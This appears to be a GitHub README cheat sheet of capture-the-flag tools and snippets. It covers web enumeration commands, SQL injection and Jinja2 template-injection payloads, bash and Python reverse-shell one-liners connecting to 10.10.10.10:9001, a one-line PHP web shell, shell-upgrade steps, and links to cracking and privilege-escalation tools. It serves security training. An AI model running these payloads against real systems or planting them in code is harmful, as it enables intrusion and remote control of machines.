<div align="center">

# CTF Useful Tools

![Status](https://img.shields.io/badge/Status-Active-success?style=for-the-badge)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)

<p align="center">
  <a href="#-web-exploitation">Web</a> •
  <a href="#-privilege-escalation">PrivEsc</a> •
  <a href="#-shells--reverse-shells">Shells</a> •
  <a href="#-cryptography--stego">Crypto</a> •
  <a href="#-wordlists">Wordlists</a>
</p>

</div>

---

## 📌 Table of Contents

1. [🌐 Web Exploitation](#-web-exploitation) - SQLi, XSS, RCE, IDOR
2. [🐧 Privilege Escalation](#-privilege-escalation) - Linux & Windows Automation
3. [🐚 Shells & Reverse Shells](#-shells--reverse-shells) - One-liners & Generators
4. [🔐 Cryptography & Stego](#-cryptography--stego) - Decoders & Cracking
5. [📚 Wordlists](#-wordlists) - Dictionary links
6. [🛠️ Online Resources](#-online-resources) - Useful websites

---

## 🌐 Web Exploitation

### 🛠️ Essential Tools
| Tool | Description | Link |
| :--- | :--- | :--- |
| **Burp Suite** | The #1 tool for web app security testing | [Download](https://portswigger.net/burp) |
| **SQLMap** | Automates detection and exploitation of SQL injection | [GitHub](https://github.com/sqlmapproject/sqlmap) |
| **Gobuster** | Directory/File, DNS and VHost busting | [GitHub](https://github.com/OJ/gobuster) |
| **Wappalyzer** | Identify technology stack of websites | [Website](https://www.wappalyzer.com/) |
| **FFuF** | Fast web fuzzer | [GitHub](https://github.com/ffuf/ffuf) |

### 💉 Common Payloads
**Basic Port Scanning**
```bash
nmap -sC -sV -oN nmap.log $IP
```

**Basic Directory Discovery**
#### Using `Feroxbuster`
```bash
feroxbuster -u http://$IP/ -w /path/to/wordlist.txt
```

#### Using `ffuf`
```bash
ffuf -u http://$IP/FUZZ -w /path/to/wordlist.txt -e .php,.txt,.zip,.bkp -t 40 # 40 - default
```

Recursive:
```bash
ffuf -u http://$IP/FUZZ -w /path/to/wordlist.txt -e .php,.txt,.zip,.bkp -t 40 -recursive
```

#### Using `dirb`
```bash
dirb http://$IP/ /path/to/wordlist.txt # -r to DISABLE recursion
```

**SQLi**
```
' OR 1=1 --
admin' --
' UNION SELECT 1, version(), database() --
```

**SSTI (Jinja2)**
```
{{7*7}}
{{config.items()}}
```

### 🐧 Privilege Escalation


| OS    |	Tool	    | Description |
| :---  | :---      | :---        |
| Linux |	LinPEAS	  | The best privilege escalation script |
| Linux	| LinEnum	  | Shell script for local enumeration |
| Linux	| GTFOBins	| List of Unix binaries to bypass security |
| Windows | WinPEAS	| Windows version of LinPEAS |
| Windows | Mimikatz | Extract plaintexts passwords, hashes, PINs |

### 🐚 Shells & Reverse Shells
#### One-liners
```bash
bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```php
<?php system($_GET['cmd']); ?>
```

#### Upgrading Shell
Scripts to get TTY
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 🔐 Cryptography & Stego
| Category | Tool | Description |
| :--- | :--- | :--- |
| Stego | StegSolve | Analyze images (color planes) |
| Stego | Steghide | Hide data in various kinds of audio/image |
| Crypto | John the Ripper | Fast password cracker |
| Crypto | Hashcat | World's fastest cracker (GPU) |
| Crypto | RsaCtfTool	| RSA attack tool (mostly for CTF) |

### 📚 Wordlists
- `SecLists` - [The "Bible" of wordlists](https://github.com/danielmiessler/SecLists)

- `RockYou.txt` - [\[Download link\] The classic leaked passwords list](https://github.com/danielmiessler/SecLists/raw/6124cb260fdb69854be33d63aa55ec4e073cde8f/Passwords/Leaked-Databases/rockyou.txt.tar.gz)

- `Assetnote Wordlists` - [High quality automated lists](https://wordlists.assetnote.io/)

- `FuzzDB` - [Attack patterns and primitives](https://github.com/fuzzdb-project/fuzzdb)

### 🛠️ Online Resources
[CyberChef](https://gchq.github.io/CyberChef/) - The "Cyber Swiss Army Knife" for encoding/decoding

[RevShells](https://www.revshells.com/) - Reverse Shell generator

[CrackStation](https://crackstation.net/) - Massive online hash database lookup

[GTFOBins](https://gtfobins.org/) - Unix binaries bypass helper

[LOLBAS](https://lolbas-project.github.io/#) - Windows binaries bypass helper

[HackTricks](https://book.hacktricks.wiki/en/index.html) - The ultimate CTF wiki
